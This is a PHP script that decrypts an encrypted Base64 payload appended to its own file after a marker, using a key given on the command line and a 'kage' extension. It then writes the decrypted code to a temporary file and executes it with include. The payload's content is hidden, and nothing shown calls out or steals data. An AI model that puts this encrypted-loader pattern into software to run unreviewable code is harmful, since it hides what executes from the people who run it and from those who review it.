<?php
// This is a self-decrypting PHP file
// Usage: php self_decrypt.php <key>

if (!extension_loaded('kage')) {
    die("Error: Kage extension is not loaded\n");
}

// Enable error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Define the expected length of the encrypted Base64 string
const EXPECTED_ENCRYPTED_LENGTH = 644;

echo "Debug: Starting decryption process...\n";

echo "Debug: EXPECTED_ENCRYPTED_LENGTH: " . EXPECTED_ENCRYPTED_LENGTH . " bytes\n";

// Get the key from command line argument
$key = $argv[1] ?? null;
if (!$key) {
    die("Error: Please provide the decryption key as a command line argument\n");
}

echo "Debug: Key length: " . strlen($key) . " bytes\n";

// Make sure the key is the correct length
if (strlen($key) != SODIUM_CRYPTO_SECRETBOX_KEYBYTES) {
    // Pad or truncate the key to the correct length
    $key = str_pad(substr($key, 0, SODIUM_CRYPTO_SECRETBOX_KEYBYTES), 
                   SODIUM_CRYPTO_SECRETBOX_KEYBYTES, 
                   "\0");
    echo "Debug: Key adjusted to " . SODIUM_CRYPTO_SECRETBOX_KEYBYTES . " bytes\n";
}

// Get the current file's content
$fileContent = file_get_contents(__FILE__);

if ($fileContent === false) {
    die("Error: Failed to read file contents\n");
}

echo "Debug: File content length: " . strlen($fileContent) . " bytes\n";

// Find the encrypted content (after the marker)
$marker = "##!!!##";
$markerPos = strrpos($fileContent, $marker);  // Use strrpos to find last occurrence

echo "Debug: Marker length: " . strlen($marker) . " bytes\n";
echo "Debug: Substr start position: " . ($markerPos + strlen($marker)) . " bytes\n";

if ($markerPos === false) {
    die("Error: No encrypted content found\n");
}

echo "Debug: Found marker at position: " . $markerPos . "\n";

// Extract the encrypted content with a fixed length to avoid trailing garbage
$encryptedContent = trim(substr($fileContent, $markerPos + strlen($marker), EXPECTED_ENCRYPTED_LENGTH));
echo "Debug: Encrypted content length (fixed): " . strlen($encryptedContent) . " bytes\n";
echo "Debug: First 10 chars of encrypted content: " . substr($encryptedContent, 0, 10) . "\n";

// Decrypt the content
echo "Debug: Attempting decryption...\n";
$decryptedContent = kage_decrypt_c($encryptedContent, $key);
if ($decryptedContent === false) {
    die("Error: Failed to decrypt content\n");
}

echo "Debug: Decryption successful\n";
echo "Debug: Decrypted content length: " . strlen($decryptedContent) . " bytes\n";
echo "Debug: First 100 chars of decrypted content: " . substr($decryptedContent, 0, 100) . "\n";

// Execute the decrypted content
echo "Debug: Executing decrypted content...\n";
ob_start();
// Write the decrypted content to a temporary file and include it
$tempFile = tempnam(sys_get_temp_dir(), 'kage_');
file_put_contents($tempFile, $decryptedContent);
$result = include($tempFile);
unlink($tempFile); // Clean up the temporary file
$output = ob_get_clean();

// Display the output
echo $output;

if ($result !== false) {
    echo "Debug: Execution completed successfully\n";
} else {
    echo "Debug: Execution completed with errors\n";
}
exit(0); // Exit after execution to prevent parsing trailing encrypted data as PHP code
?>##!!!##ehbr2KZ/yzxwtw9cMcgs6mP9YE47cGZiLiD2ruejzaWqG+RZWaf9O8If5e6K+K8BVNBEmJaNGTOwh0obLkR7CVcKU6Gg6Q0TI+GmeFCt0tI/NGqfW/S+q88iDbiaJnaETcIpvtiUaimjBkXv8EVKYhBTMCIGMcQkt4dJOXhALT7V+ljxxoYTjrHPHKd1wZAO6gPQEJH5lwINOJBCYUFDLLfXw43C9RiMwTcKBjKhnJ6Z6sBkl8drwaK9zaq9unMe44kYtUW0p74ESwPI38B5vIYvxAFGwaEXkpFTRuH0FnVK0dYwHaMoRJOa+gFFC6hsscHkhiyRh4XKbjZSwoW9MnPkCly/wMitlDinDIZNg7Qv31yMA7cuJ1ylRCRHPcH0XjDPP6/pm3JIFsGpxcXl2FZgEajHzRd2qnIojEgMD23QHmF56T1jVYmCXVIU8tQhu1M6BncjiOcw1aC9XeJYsGKKtcRr2Dzn+vs1tJqEykTPure4JCvrdbvMigolHVXaMo7pBbMHvLDxlNR3eDTkxKarlkV48L/Bfy2t0A5yHWShIJqbgJM+QJ60NHYyCuJ93AZp949Az4DAle/C19gbj0rpuDcU//bVfwxcSonGBsJBhUQzj5j0rneOIhst3wQ0qZ4=